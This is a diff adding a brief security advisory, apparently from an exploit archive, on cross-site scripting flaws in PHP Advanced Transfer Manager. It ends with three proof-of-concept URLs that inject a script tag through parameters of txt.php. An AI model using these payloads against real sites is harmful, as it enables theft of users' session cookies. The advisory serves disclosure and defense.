@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/14887/info
+
+PHP Advanced Transfer Manager is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+http://www.example.com/phpatm/viewers/txt.php?font=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/phpatm/viewers/txt.php?normalfontcolor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/phpatm/viewers/txt.php?mess[31]=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E 
